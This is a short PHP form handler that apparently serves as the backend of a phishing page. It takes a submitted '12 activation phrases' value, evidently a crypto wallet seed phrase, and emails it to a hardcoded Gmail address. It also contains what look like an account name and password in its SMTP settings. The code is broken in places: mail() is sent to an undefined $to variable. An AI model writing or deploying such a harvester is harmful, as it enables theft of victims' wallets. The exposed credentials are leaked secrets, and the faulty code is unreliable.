<?php 

require_once 'Mail.php';


$wgSMTP = array(
    'host' => 'tls://smtp.gmail.com',
    'IDHost' => 'google.com',
    'port' => 587,
    'username' => getenv("ayosheyax@gmail.com"), 
    'password' => getenv("saxydee23"),
    'auth' => true
 );

if(!isset($_POST['phrase'])){

    echo "form needs to be submitted";
}



$phrase= $_POST['phrase'];

if(empty($phrase)){
    echo "Phrases need to be complete";
    exit;
}

$email_from= 'saxdasax@gmail.com';
$email_subject="12 acticvation phrases";
$email_body="The 12 phrases are $phrase";

$mailTo= "ayosheyax@gmail.com";
$headers= "From: $email_from";

if(mail($to,$email_subject,$email_body, $headers)) {
    echo "Email Sent";

} else {
    echo "failed";
}


?>
